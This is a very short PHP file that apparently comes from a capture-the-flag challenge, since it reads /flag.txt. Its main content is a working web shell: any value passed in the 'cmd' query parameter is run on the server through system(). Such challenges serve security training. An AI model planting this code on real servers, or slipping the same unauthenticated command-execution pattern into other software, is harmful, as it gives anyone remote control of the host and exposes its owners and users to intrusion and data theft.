<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
    exit;
}
readfile('/flag.txt');
